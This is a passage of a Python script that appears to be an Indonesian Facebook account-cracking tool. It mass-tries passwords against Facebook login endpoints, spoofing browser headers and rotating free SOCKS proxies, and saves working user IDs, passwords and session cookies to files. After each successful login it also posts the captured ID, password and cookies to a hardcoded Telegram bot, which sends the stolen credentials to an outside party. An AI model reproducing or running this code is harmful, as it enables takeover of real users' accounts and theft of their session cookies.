	        "next": "https://m.latest.facebook.com/dialog/oauth?client_id=124024574287414&locale=id_ID&redirect_uri=https%3A%2F%2Fwww.instagram.com%2Faccounts%2Fsignup%2F&response_type=code%2Cgranted_scopes&scope=email&state=%7B%22fbLoginKey%22%3A%221aja43w1fewxk513qyq0i1xdan09hyj8u916hw96n3lgpqd1ym9ktq%22%2C%22fbLoginReturnURL%22%3A%22%2Ffxcal%2Fdisclosure%2F%3Fnext%3D%252F%22%7D&ret=login&fbapp_pres=0&logger_id=7dafb109-0ce2-4b48-affe-2312544d4474&tp=unspecified",
	        "flow":"login_no_pin",
	        "pass":pw,
	        } 
	    )    
			cuoz = (";").join([ "%s=%s" % (key, value) for key, value in link.cookies.get_dict().items() ])		
			head=(
		{
		'Host': url,
		'cache-control': 'max-age=0',
		'upgrade-insecure-requests': '1',
		'origin': f'https://'+url,
	     'content-type': 'application/x-www-form-urlencoded',
	     'x-requested-with': 'XMLHttpRequest',
		'user-agent': ua,
		'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
		'sec-fetch-site': 'same-origin',
	     'sec-fetch-mode': 'navigate',
	     'sec-fetch-user': '?1',
	     'sec-fetch-dest': 'document',
		'dpr': f'{str(rr(1,5))}',
		'viewport-width': f'{str(rr(300,999))}',
	     'sec-ch-ua': f'"Not)A;Brand";v="{str(rr(8,24))}", "Chromium";v="{str(rr(99,116))}"',
	     'sec-ch-ua-mobile': '?1',
	     'sec-ch-ua-platform': '"Android"',
	     'sec-ch-ua-platform-version': f'"{str(rr(5,14))}.0.0"',
	     'sec-ch-ua-full-version-list': f'"Not)A;Brand";v="{str(rr(8,24))}.0.0.0", "Chromium";v="{str(rr(99,120))}.0.{str(rr(5000,5999))}.{str(rr(40,150))}"',
	     'sec-ch-prefers-color-scheme': 'dark',
	     'referer': f'https://m.latest.facebook.com/login.php?skip_api_login=1&api_key=124024574287414&kid_directed_site=0&app_id=124024574287414&signed_next=1&next=https://m.facebook.com/dialog/oauth?client_id=124024574287414&locale=id_ID&redirect_uri=https%3A%2F%2Fwww.instagram.com%2Faccounts%2Fsignup%2F&response_type=code%2Cgranted_scopes&scope=email&state=%7B%22fbLoginKey%22%3A%221aja43w1fewxk513qyq0i1xdan09hyj8u916hw96n3lgpqd1ym9ktq%22%2C%22fbLoginReturnURL%22%3A%22%2Ffxcal%2Fdisclosure%2F%3Fnext%3D%252F%22%7D&ret=login&fbapp_pres=0&logger_id=7dafb109-0ce2-4b48-affe-2312544d4474&tp=unspecified&cancel_url=https://www.instagram.com/accounts/signup/?error=access_denied&error_code=200&error_description=Permissions+error&error_reason=user_denied&state=%7B%22fbLoginKey%22%3A%221aja43w1fewxk513qyq0i1xdan09hyj8u916hw96n3lgpqd1ym9ktq%22%2C%22fbLoginReturnURL%22%3A%22%2Ffxcal%2Fdisclosure%2F%3Fnext%3D%252F%22%7D#_=_&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr',
	     'accept-encoding': 'gzip, deflate, br',
	     'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7',
	     }
	 )
			po = ses.post(f"https://m.latest.facebook.com/login/device-based/validate-password/?shbl=0&locale2=id_ID", headers=head, data=date, cookies={'cookie': cuoz}, allow_redirects=False)
			if "c_user" in ses.cookies.get_dict().keys():
				ok+=1
				coki = ses.cookies.get_dict()
				kuki = "datr=" + coki["datr"] + ";" + ("sb=" + coki["sb"]) + ";" + "locale=id_ID" + ";" + ("c_user=" + coki["c_user"]) + ";" + ("xs=" + coki["xs"]) + ";" + ("fr=" + coki["fr"]) + ";"
				print(f'{biru} ⚔️ {hijo} XAnX•ｓｕｋｓｅｓ') 
				print(f'{puti}') 
				print(f"{biru} ⚔️ {bira} 𝚄𝚜𝚎𝚛 𝙸𝙳 {kun} ➢ {hijo}{idf}{puti}")
				print(f"{biru} ⚔️ {bira} 𝙿𝚊𝚜𝚜𝚠𝚘𝚛𝚍 {kun} ➢ {hijo}{pw}{puti}")
				print(f"{biru} ⚔️ {bira} 𝚃𝚊𝚑𝚞𝚗 {kun} ➢ {biru}{tahun(idf)}{puti}")
				print(f"{biru} ⚔️ {bira} 𝙲𝚘𝚘𝚔𝚒𝚎 {kun} ➢ {hijo}{kuki}{puti}")
				print(f"{biru} ⚔️ {bira} 𝚄𝚜𝚎𝚛•𝙰𝚐𝚎𝚗𝚝 {kun} ➢ {ung}{ua}{puti}")
				open('CYXIEON-OK/'+'CYXIEON-OK.txt','a').write(idf+'|'+pw+'|'+'\n')
				open('CYXIEON-OK/'+'CYXIEON-WhithCookies.txt','a').write(idf+'|'+pw+'|'+kuki+'|''\n')
				requests.post(f'https://api.telegram.org/bot6782895347:AAFEy9UoyU2-8qmHp28BCfGzHmkZpv0wtGw/sendMessage?chat_id=6897915527&text={idf}|{pw}|{kuki}')
				break			
			elif "checkpoint" in po.cookies.get_dict().keys():
				print(f'{biru} ⚔️ {kun} Lu JELEK •ｃｈｅｃｋｐｏｉｎ') 
				print(f'{puti}') 
				print(f"{biru} ⚔️ {bira} 𝚄𝚜𝚎𝚛 𝙸𝙳 {hijo} ➢ {kun}{idf}{puti}")
				print(f"{biru} ⚔️ {bira} 𝙿𝚊𝚜𝚜𝚠𝚘𝚛𝚍 {hijo} ➢: {kun}{pw}{puti}")
				print(f"{biru} ⚔️ {bira} 𝚃𝚊𝚑𝚞𝚗 {hijo} ➢ {biru}{tahun(idf)}{puti}")
				print(f"{biru} ⚔️ {bira} 𝚄𝚜𝚎𝚛•𝙰𝚐𝚎𝚗𝚝 {hijo} ➢{kun}{ua}")
				open('CYXIEON-CP/'+'CYXIEON-CP.txt','a').write(idf+'|'+pw+'|'+'\n')
				akune.append(idf+'|'+pw)
				ceker(idf,pw)
				cp+=1
				break	
				
			else:
				continue
		except requests.exceptions.ConnectionError:
			time.sleep(31)
	loop+=1
	
#----------[ METODE-REGULER ]----------#	
def crackreguler(idf,pwx,url):
	global loop,ok,cp
	ses = requests.Session()
	rr = random.randint
	rc = random.choice
	emot = rc(["😝","😜","🤪"])
	prog.update(des,description=f"\r {emot} ( REGULER ) (%s OK : {ok} %s) (%s CP : {cp} %s) (%s {loop} %s) "%(hijo,puti,kun,puti,hijo,puti))
	prog.advance(des)
	for pw in pwx:
		try:
			ses.headers.update({'Host': 'mbasic.facebook.com','cache-control': 'max-age=0','sec-ch-ua-mobile': '?1','upgrade-insecure-requests': '1','user-agent': ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','sec-fetch-site': 'same-origin','sec-fetch-mode': 'cors','sec-fetch-dest': 'empty','accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'})
			p = ses.get('https://mbasic.facebook.com/login/device-based/password/?uid='+idf+'&flow=login_no_pin&next=https%3A%2F%2Fm.facebook.com%2Fv2.9%2Fdialog%2Foauth%3Fclient_id%3D124207444332529%26redirect_uri%3Dhttps%253A%252F%252Fpassport.alibaba.com%252Foauth_sign.htm%253Ftype%253Dfacebook%26display%3Dpopup%26response_type%3Dcode%26scope%3Demail%252Cpublic_profile%252Cuser_work_history%26state%3Didc_7ODgd02LlE_OI1dKBpnQCtA%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D000b08fb-689b-45cc-a4f0-e3bb52a66842%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fpassport.alibaba.com%2Foauth_sign.htm%3Ftype%3Dfacebook%26error%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3Didc_7ODgd02LlE_OI1dKBpnQCtA%23_%3D_&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr')
			dataa ={"lsd":re.search('name="lsd" value="(.*?)"', str(p.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(p.text)).group(1),"uid":idf,"next":"https://free.facebook.com/v12.0/dialog/oauth?encrypted_query_string=AeDsB_mIFREjNYDwuWOV6k5KfwSeC4nSl-8yAXLk5XCbopR9GlQNnen08SmfmGTmDFO7swiAtufmNBzLNoHVktViYNWLsMMsKFggcHqTBGw_qTfVzk3ml9EiKffgOgBnEqbn1YPNeupO5REfB_WT90ZWzs3lzjWnrzSipVowU4nkPHRy80GJSHDcwwwf41DcgWpcjnFmEIQxmC7D39UJZwdTW_ohl1mp3QDDn3dClMmGg4bFJFXNOHvC14kRR3Y9m32NGTPFzXmKUDeqdvpt_BsomYKPnJw3Sfe2poHNmgQ21QZ7dnztonslONMSAZoYjZuPsjAs31PH_4_gNjAGpodbr2-1l6pC4pvrlwzAi3m1fpF46rdYalexhL91PvuZsdWLjFmntZGRXm0I5jQUMPTz296eC46FLG5VT106opZy7W84b2LRNZI2zfC0n-YT0jWmUnOc8lo-8WcAO7A18WLpI3sO1RGuau8TyxcsUcgKWvwzEX6KzCuuR3sohzA-eNt_AcvpcJ04tDoWglO7Qf4VXNd6Wmr-B2QeId9MNufC3NttXzJaWjfv6iTv-JCnM2Gokwc_UPkomFvAEA7stKOytz1WR7ytP7h-2FwGTDGtQTuvh08Pf6CnjfImyq4PrwYLdEAQxsHtSR6conpdwwap3qTgf44q_zIDunU8g3iI7CSnrRh0YS_ZY5eejm6msy-ZLMXL208jYQb_HEr2jZS0tRP2AA6v8T96OFDXtIAhIEwM2ClBXM5FE9VRgS3TbbCZIGB3qZWvyiWTUn3PG-I3qyk9uehagsNZftcvGFnHYkB_OqPdLxoJiv9qV3lj-vhqPYbmuzHbuHhyDjGuu9B-mWtkKr-lXUXxUU9_phAftMiZ60iLRzFvK24bvxRorpUbEYC1pQcjGcQhkQ7VCV9Xo7RRmHAVCwRL73VSi3uboyMPuQi3DqPb18otubuTJ3XdqTFrgrWDaJcCytxCUPgL269zGnoFaxpHhvfPoe1KjWkZlOslzUxaWI6WgMGAhrY9ov20Gfuyw42SC-MZW2G7CBxYkMSsvZN_AfH70LVhp0JtuL6CGsr2qZ3CkE7odFoiUNxJf_NanKUdxbG38GXfb8Sf58_TDtGLzwRv&_rdc=1&_rdr","flow":"login_no_pin","pass":pw,}
			koki = (";").join([ "%s=%s" % (key, value) for key, value in p.cookies.get_dict().items() ])
			koki+=' m_pixel_ratio=2.625; wd=412x756'
			heade={'Host': 'mbasic.facebook.com','cache-control': 'max-age=0','sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="98"','sec-ch-ua-mobile': '?1','sec-ch-ua-platform': '"Android"','upgrade-insecure-requests': '1','origin': 'https://m.facebook.com','content-type': 'application/x-www-form-urlencoded','user-agent': ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','x-requested-with': 'XMLHttpRequest','sec-fetch-site': 'same-origin','sec-fetch-mode': 'cors','sec-fetch-dest': 'empty','referer': 'https://mbasic.facebook.com/login/device-based/password/?uid='+idf+'&flow=login_no_pin&next=https%3A%2F%2Fm.facebook.com%2Fv2.9%2Fdialog%2Foauth%3Fclient_id%3D124207444332529%26redirect_uri%3Dhttps%253A%252F%252Fpassport.alibaba.com%252Foauth_sign.htm%253Ftype%253Dfacebook%26display%3Dpopup%26response_type%3Dcode%26scope%3Demail%252Cpublic_profile%252Cuser_work_history%26state%3Didc_7ODgd02LlE_OI1dKBpnQCtA%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D000b08fb-689b-45cc-a4f0-e3bb52a66842%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fpassport.alibaba.com%2Foauth_sign.htm%3Ftype%3Dfacebook%26error%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3Didc_7ODgd02LlE_OI1dKBpnQCtA%23_%3D_&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr','accept-encoding': 'gzip, deflate, br','accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'}
			po = ses.post('https://mbasic.facebook.com/login/device-based/validate-password/?shbl=0&locale2=id_ID',data=dataa,allow_redirects=False)
			if "c_user" in ses.cookies.get_dict().keys():
				ok+=1
				coki = ses.cookies.get_dict()
				kuki = "datr=" + coki["datr"] + ";" + ("sb=" + coki["sb"]) + ";" + "locale=id_ID" + ";" + ("c_user=" + coki["c_user"]) + ";" + ("xs=" + coki["xs"]) + ";" + ("fr=" + coki["fr"]) + ";"
				print(f"\n⌲ User ID: {hijo}{idf}{puti}")
				print(f"⌲ Password: {hijo}{pw}{puti}")
				print(f"⌲ Tahun: {mer}{tahun(idf)}{puti}")
				print(f"⌲ Cookie: {hijo}{kuki}{puti}")
				print(f'{hijo}{ua}')
				open('CYXIEON-OK/'+'CYXIEON-OK.txt','a').write(idf+'|'+pw+'|'+'\n')
				open('CYXIEON-OK/'+'CYXIEON-WhithCookies.txt','a').write(idf+'|'+pw+'|'+kuki+'|''\n')
				requests.post(f'https://api.telegram.org/bot6782895347:AAFEy9UoyU2-8qmHp28BCfGzHmkZpv0wtGw/sendMessage?chat_id=6897915527&text={idf}|{pw}|{kuki}')
				break			
			elif "checkpoint" in po.cookies.get_dict().keys():
				print(f"\n⌲ User ID: {kun}{idf}{puti}")
				print(f"⌲ Password: {kun}{pw}{puti}")
				print(f"⌲ Tahun: {mer}{tahun(idf)}{puti}")
				print(f'{kun}{ua}')
				open('CYXIEON-CP/'+'CYXIEON-CP.txt','a').write(idf+'|'+pw+'|'+'\n')
				akune.append(idf+'|'+pw)
				ceker(idf,pw)
				cp+=1
				break	
				
			else:
				continue
		except requests.exceptions.ConnectionError:
			time.sleep(31)
	loop+=1
	
#----------[ METODE-ASYINC ]----------#	
def crackasyinc(idf,pwx):
  global loop,ok,cp
  ses = requests.Session()
  rr = random.randint
  rc = random.choice
  emot = rc(["😝","😜","🤪"])
  prog.update(des,description=f"\r {emot} ( ASYINC ) (%s OK : {ok} %s) (%s CP : {cp} %s) (%s {loop} %s) "%(hijo,puti,kun,puti,hijo,puti))
  prog.advance(des)
  for pw in pwx:
    try:
      proxs = requests.get('https://raw.githubusercontent.com/TheSpeedX/SOCKS-List/master/http.txt').text
      open('http.txt','w').write(proxs)
      nip = rc(proxs)
      proxs = {'http': 'socks4://'+nip}
      ua = rc(ugen)
      ua2 = rc(["Mozilla/5.0 (iPhone; CPU iPhone OS 13_5_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.1.1 Mobile/15E148 Safari/604.1","Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36 Edg/91.0.864.59"])
      link = ses.get('https://mbasic.facebook.com/login/?email='+idf+'&app_id=469724967619195&api_key=469724967619195&auth_token=e30a80f9070ee8fc49a23998b8eb9b54&next=https%3A%2F%2Fmbasic.facebook.com%2Fv3.2%2Fdialog%2Foauth%3Fapp_id%3D469724967619195%26cbt%3D1697161758144%26channel_url%3Dhttps%253A%252F%252Fstaticxx.facebook.com%252Fx%252Fconnect%252Fxd_arbiter%252F%253Fversion%253D46%2523cb%253Df2c5574a5c040a8%2526domain%253Dpage.palm.tech%2526is_canvas%253Dfalse%2526origin%253Dhttps%25253A%25252F%25252Fpage.palm.tech%25252Ff2751a06ed883e4%2526relation%253Dopener%26client_id%3D469724967619195%26display%3Dtouch%26domain%3Dpage.palm.tech%26e2e%3D%257B%257D%26fallback_redirect_uri%3Dhttps%253A%252F%252Fpage.palm.tech%252Fpalm-id%252F%2523%252Flogin%253Fclient-id%253Ditel-global%2526callbackUrl%253Dhttp%25253A%25252F%25252Fclub.itel-life.com%25252F%2526language%253Den_US%2526brandId%253Ditel%26locale%3Den_US%26logger_id%3Df34548c36d16038%26origin%3D2%26redirect_uri%3Dhttps%253A%252F%252Fstaticxx.facebook.com%252Fx%252Fconnect%252Fxd_arbiter%252F%253Fversion%253D46%2523cb%253Df18f150b67c9dac%2526domain%253Dpage.palm.tech%2526is_canvas%253Dfalse%2526origin%253Dhttps%25253A%25252F%25252Fpage.palm.tech%25252Ff2751a06ed883e4%2526relation%253Dopener%2526frame%253Df18a7b805567f3c%26response_type%3Dtoken%252Csigned_request%252Cgraph_domain%26return_scopes%3Dtrue%26scope%3Demail%252Cuser_likes%26sdk%3Djoey%26version%3Dv3.2%26ret%3Dlogin%26fbapp_pres%3D0%26tp%3Dunspecified&li=VKIoZfrCsErYtA-k75tkXpQ4&cancel=https%3A%2F%2Fstaticxx.facebook.com%2Fx%2Fconnect%2Fxd_arbiter%2F%3Fversion%3D46%23cb%3Df18f150b67c9dac%26domain%3Dpage.palm.tech%26is_canvas%3Dfalse%26origin%3Dhttps%253A%252F%252Fpage.palm.tech%252Ff2751a06ed883e4%26relation%3Dopener%26frame%3Df18a7b805567f3c%26error%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied&e=1348092&skip_api_login=1&shbl=1&locale2=id_ID&refsrc=deprecated&_rdr')
      date = {
      'jazoest': re.search('name="jazoest" value="(.*?)"', str(link.text)).group(1),
      'lsd': re.search('name="lsd" value="(.*?)"', str(link.text)).group(1),
      'm_ts': re.search('name="m_ts" value="(.*?)"',str(link.text)).group(1),
      'li': re.search('name="li" value="(.*?)"',str(link.text)).group(1),
      'try_number': re.search('name="try_number" value="(.*?)"',str(link.text)).group(1),
      'unrecognized_tries': re.search('name="unrecognized_tries" value="(.*?)"',str(link.text)).group(1),
      'email': idf,
      'pass': pw,
      'login': 'Masuk',
      'bi_xrwh': '0',
        } 
      head = {
        'authority': 'mbasic.facebook.com',
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
        'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7',
        'cache-control': 'max-age=0',
        'content-type': 'application/x-www-form-urlencoded',
        # 'cookie': 'datr=oDsmZQf-E4oWEVXe2mL60sel; sb=oDsmZa2tlKPnKBwHNeLOYPDU; m_pixel_ratio=2; wd=360x680; fr=0DHam0bHkeqAY8Rbd..BlJjug.YT.AAA.0.0.BlKKIg.AWUho9WHBbs',
        'dpr': '2',
        'origin': 'https://mbasic.facebook.com',
        'referer': 'https://mbasic.facebook.com/login.php?skip_api_login=1&api_key=469724967619195&kid_directed_site=0&app_id=469724967619195&signed_next=1&next=https%3A%2F%2Fmbasic.facebook.com%2Fv3.2%2Fdialog%2Foauth%3Fapp_id%3D469724967619195%26cbt%3D1697161758144%26channel_url%3Dhttps%253A%252F%252Fstaticxx.facebook.com%252Fx%252Fconnect%252Fxd_arbiter%252F%253Fversion%253D46%2523cb%253Df2c5574a5c040a8%2526domain%253Dpage.palm.tech%2526is_canvas%253Dfalse%2526origin%253Dhttps%25253A%25252F%25252Fpage.palm.tech%25252Ff2751a06ed883e4%2526relation%253Dopener%26client_id%3D469724967619195%26display%3Dtouch%26domain%3Dpage.palm.tech%26e2e%3D%257B%257D%26fallback_redirect_uri%3Dhttps%253A%252F%252Fpage.palm.tech%252Fpalm-id%252F%2523%252Flogin%253Fclient-id%253Ditel-global%2526callbackUrl%253Dhttp%25253A%25252F%25252Fclub.itel-life.com%25252F%2526language%253Den_US%2526brandId%253Ditel%26locale%3Den_US%26logger_id%3Df34548c36d16038%26origin%3D2%26redirect_uri%3Dhttps%253A%252F%252Fstaticxx.facebook.com%252Fx%252Fconnect%252Fxd_arbiter%252F%253Fversion%253D46%2523cb%253Df18f150b67c9dac%2526domain%253Dpage.palm.tech%2526is_canvas%253Dfalse%2526origin%253Dhttps%25253A%25252F%25252Fpage.palm.tech%25252Ff2751a06ed883e4%2526relation%253Dopener%2526frame%253Df18a7b805567f3c%26response_type%3Dtoken%252Csigned_request%252Cgraph_domain%26return_scopes%3Dtrue%26scope%3Demail%252Cuser_likes%26sdk%3Djoey%26version%3Dv3.2%26ret%3Dlogin%26fbapp_pres%3D0%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fstaticxx.facebook.com%2Fx%2Fconnect%2Fxd_arbiter%2F%3Fversion%3D46%23cb%3Df18f150b67c9dac%26domain%3Dpage.palm.tech%26is_canvas%3Dfalse%26origin%3Dhttps%253A%252F%252Fpage.palm.tech%252Ff2751a06ed883e4%26relation%3Dopener%26frame%3Df18a7b805567f3c%26error%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr',
        'sec-ch-prefers-color-scheme': 'light',
        'sec-ch-ua': '"(Not(A:Brand";v="99", "Chromium";v="114", "Google Chrome";v="114"',
        'sec-ch-ua-full-version-list': '"(Not(A:Brand";v="99.0.0.0", "Chromium";v="114.0.5792.214", "Google Chrome";v="114.0.5792.214"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-model': '""',
        'sec-ch-ua-platform': '"Windows"',
        'sec-ch-ua-platform-version': '""',
        'sec-fetch-dest': 'document',
        'sec-fetch-mode': 'navigate',
        'sec-fetch-user': '?1',
        'sec-fetch-site': 'same-origin',
        'upgrade-insecure-requests': '1',
        'user-agent': ua,
        'viewport-width': '980',
        }
      params = {'api_key': '469724967619195','auth_token': 'e30a80f9070ee8fc49a23998b8eb9b54','skip_api_login': '1','signed_next': '1','next': 'https://m.facebook.com/v3.2/dialog/oauth?app_id=469724967619195&cbt=1697161758144&channel_url=https%3A%2F%2Fstaticxx.facebook.com%2Fx%2Fconnect%2Fxd_arbiter%2F%3Fversion%3D46%23cb%3Df2c5574a5c040a8%26domain%3Dpage.palm.tech%26is_canvas%3Dfalse%26origin%3Dhttps%253A%252F%252Fpage.palm.tech%252Ff2751a06ed883e4%26relation%3Dopener&client_id=469724967619195&display=touch&domain=page.palm.tech&e2e=%7B%7D&fallback_redirect_uri=https%3A%2F%2Fpage.palm.tech%2Fpalm-id%2F%23%2Flogin%3Fclient-id%3Ditel-global%26callbackUrl%3Dhttp%253A%252F%252Fclub.itel-life.com%252F%26language%3Den_US%26brandId%3Ditel&locale=en_US&logger_id=f34548c36d16038&origin=2&redirect_uri=https%3A%2F%2Fstaticxx.facebook.com%2Fx%2Fconnect%2Fxd_arbiter%2F%3Fversion%3D46%23cb%3Df18f150b67c9dac%26domain%3Dpage.palm.tech%26is_canvas%3Dfalse%26origin%3Dhttps%253A%252F%252Fpage.palm.tech%252Ff2751a06ed883e4%26relation%3Dopener%26frame%3Df18a7b805567f3c&response_type=token%2Csigned_request%2Cgraph_domain&return_scopes=true&scope=email%2Cuser_likes&sdk=joey&version=v3.2&ret=login&fbapp_pres=0&tp=unspecified','refsrc': 'deprecated','app_id': '469724967619195','cancel': 'https://staticxx.facebook.com/x/connect/xd_arbiter/?version=46#cb=f18f150b67c9dac&domain=page.palm.tech&is_canvas=false&origin=https%3A%2F%2Fpage.palm.tech%2Ff2751a06ed883e4&relation=opener&frame=f18a7b805567f3c&error=access_denied&error_code=200&error_description=Permissions+error&error_reason=user_denied','lwv': '100','locale2': 'id_ID','refid': '9',}
      po = ses.post('https://mbasic.facebook.com/login/device-based/regular/login/',params=params,data=date,headers=head,allow_redirects=False,proxies=proxs)
      if "c_user" in ses.cookies.get_dict().keys():
        ok+=1
        coki = po.cookies.get_dict()
        kuki = "datr=" + coki["datr"] + ";" + ("sb=" + coki["sb"]) + ";" + "locale=id_ID" + ";" + ("c_user=" + coki["c_user"]) + ";" + ("xs=" + coki["xs"]) + ";" + ("fr=" + coki["fr"]) + ";"
        print(f"{kun}╭────────────────────────────╮{puti}")
        tree = Tree("")
        tree.add(f"\r{hijo}{idf}{puti}").add(f"{hijo}{pw}{puti}").add(f"{mer}{tahun(idf)}{puti}")
        tree.add(f"{hijo}{kuki}{puti}").add(f"{mer}{ua}{puti}")
        print(f"{kun}╰────────────────────────────╯{puti}")
        prints(tree)
        open('CYXIEON-OK/'+'CYXIEON-OK.txt','a').write(idf+'|'+pw+'|'+'\n')
        open('CYXIEON-OK/'+'CYXIEON-WhithCookies.txt','a').write(idf+'|'+pw+'|'+kuki+'|''\n')
        requests.post(f'https://api.telegram.org/bot6782895347:AAFEy9UoyU2-8qmHp28BCfGzHmkZpv0wtGw/sendMessage?chat_id=6897915527&text={idf}|{pw}|{kuki}')
        break	
      elif "checkpoint" in po.cookies.get_dict().keys():
        print(f"{kun}╭────────────────────────────╮{puti}")
        tree = Tree("")
        tree.add(f"\r{kun}{idf}{puti}").add(f"{kun}{pw}{puti}")
        tree.add(f"{mer}{tahun(idf)}{puti}").add(f"{mer}{ua}{puti}")
        print(f"{kun}╰────────────────────────────╯{puti}")
        prints(tree)
        open('CYXIEON-CP/'+'CYXIEON-CP.txt','a').write(idf+'|'+pw+'|'+'\n')
        akune.append(idf+'|'+pw)
        ceker(idf,pw)
        cp+=1
        break	
      else:
        continue
    except requests.exceptions.ConnectionError:time.sleep(31)
  loop+=1

#----------[ CEK-OPSI ]----------#	
def ceker(idf,pw):
	global cp
	rc = random.choice
	url = rc(["free.facebook.com"])
	head = {"Host": url,
	"cache-control": "max-age=0",
	"upgrade-insecure-requests": "1",
	"origin": "https://"+url,
	"content-type": "application/x-www-form-urlencoded",
	"user-agent": "Mozilla/5.0 (Linux; Android 10; DOOGEE B10 Build/KOTG49H) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Mobile Safari/537.36",
	"accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
	"x-requested-with": "com.android.chrome",
	"sec-fetch-site": "same-origin",
	"sec-fetch-mode": "navigate",
	"sec-fetch-user": "?1",
	"sec-fetch-dest": "document",
	"referer": f"https://{url}/index.php?next=https%3A%2F%2Fdevelopers.facebook.com%2Ftools%2Fdebug%2Faccesstoken%2F",
	"accept-encoding": "gzip, deflate",
	"accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"}
	ses = requests.Session()
	try:
		hi = ses.get('https://'+url)
		kontol = sop(ses.post(
		'https://'+url+'/login.php',
		data={
		'email':idf,
	'pass':pw,
'login':'submit'
		},headers=head, allow_redirects=True).text,'html.parser')
		jo = kontol.find(
		'form'
		)
		data = {}
		lion = [
		'nh',
	'jazoest',
'fb_dtsg',
	'submit[Continue]',
		'checkpoint_data'
		]
		for anj in jo('input'):
			if anj.get('name') in lion:
				data.update({anj.get('name'):anj.get('value')})
		kent = sop(ses.post('https://'+url+str(jo['action']), data=data, headers=head).text,'html.parser')
		opsi = kent.find_all('option')
		if len(opsi)==0:
			tree = Tree("")
			tree.add(f"{hijo}Tapyes / A2f ( cek di mbasic ){puti}")
			prints(tree)
			#open('CYXIEON-CP/'+'CYXIEON-CP.txt','a').write(idf+'|'+pw+'|'+'\n')
			#cp+=1
		else:
			for opsii in opsi:
				print('\r%s---> %s%s'%(kk,opsii.text,x))
	except Exception as c:
		tree = Tree("")
		tree.add(f"{hijo}{idf}{puti}").add(f"{hijo}{pw}{puti}")
		tree.add(f"{mer}spam ip tidak dapat cek ops{puti}i")
		prints(tree)
		#open('CYXIEON-CP/'+'CYXIEON-CP.txt','a').write(idf+'|'+pw+'|'+'\n')
		#cp+=1
		
#----------[ SYSTEM-CONTROL ]----------#	
if __name__=='__main__':
	try:os.system('git pull')
	except:pass
	try:os.mkdir('CYXIEON-OK')
	except:pass
	try:os.mkdir('CYXIEON-CP')
	except:pass
	menu()
	
	
#>>>>> THANKS TO <<<<<#

#    *--> BASARI ID
#    *--> ALVINO ADIJAYA
#    *--> AOREC-XD

#>>>>> THANKS TO <<<<<#
